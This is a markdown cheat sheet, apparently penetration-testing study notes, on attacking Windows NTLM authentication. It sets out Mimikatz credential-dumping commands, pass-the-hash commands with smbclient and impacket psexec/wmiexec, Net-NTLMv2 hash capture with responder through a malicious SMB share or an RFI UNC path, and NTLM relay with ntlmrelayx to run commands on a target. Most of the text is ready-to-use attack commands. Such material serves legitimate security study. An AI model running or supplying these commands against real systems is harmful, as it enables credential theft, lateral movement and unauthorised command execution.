* Stealing NTLM hashes:
	- Mimikatz:
		- Can be used to steal NTLM hash from windows memory.
		- Mimikatz requires Administrator or higher privileges and SeDebugPrivilege (enables debugging for processes).
		- Use psexec to elevate to system account privileges built-in MimikatzÂ token elevation function. 
		- Example: start mimikatz on the target machine. privilege::debug, token::elevate , lsadump::sam commands will enable debugging for process, elavate to SYSTEM and dump lssas credentials.
		- Then crack the NTLM hash using Hashcat, JTR. Or use pass the hash attack.
		- [Mimikatz cheatsheet](https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49)
* Pass the hash for NTLM:
	* Since NTLM hashes are not salted they can be passed around to authenticate into services like SMB, RDP, WinRM.
	* With UAC disabled or administrator privileges, command execution is also possible.
	* Tools that support pass the hash:
		* smbclient
		* CrackMapExec
		* impacket library scripts such as psexec.py, wmiexec.py
	* Examples:
		* smbclient \\\\\<ip\>\\<share\> -U \<user\> --pw-nt-hash \<NTLM hash\>
		* impacket-psexec -hashes \<LM part of hash\>:\<NT part of hash\> \<user\>@\<ip\>
		* impacket-wmiexec -hashes \<LM part of hash\>:\<NT part of hash\> \<user\>@\<ip\>
	* If the NTLM hash obtain only contains NT part of hash then use 00000000000000000000000000000000 as the LM part of hash 
* Stealing Net-NTLMv2 hashes:
	* Net-NTLMv2 authentication protocols can be abused to obtains Net-NTLMv2 hashes and crack using hashcat or JTR.
	* Get the target to authenticate to a malicious server such as SMB using Net-NTLMv2 protocol and get Net-NTLMv2 hash.
	* responder tool can set up various malicious servers and dump Net-NTLMv2 hashes.
	* usage: sudo responder -I \<interface\>
	* if the responder is running SMB, then have the victim machine access the malicious share using something like dir \\\\\<ip\>\\<share\>. Upon connection credentials are dumped.
	* Another idea is to provide a UNC path to a web application in an RFI vulnerability (assuming its running windows).
* Relaying Net-NTLMv2 hashes:
	* Theory: Get the target to authenticate to a malicious server such as SMB using Net-NTLMv2 protocol and relay the hash to another service of your choice to authenticate.
	* Example use case: If SMB signing is not enabled it could mean that NTLM relay attacks might work since the integrity of smb request is modified by the man in middle conducting the relay.
	* impacket library's ntlmrelayx tool can be used for this attack.
	* With UAC disabled or administrator privileges, command execution is also possible.
	* Example: `impacket-ntlmrelayx -smb2support -t <target ip> -c "<a nice powershell command>"`.
	* Use something like `dir \\<rouge smb ip>\<share>` on the victim side.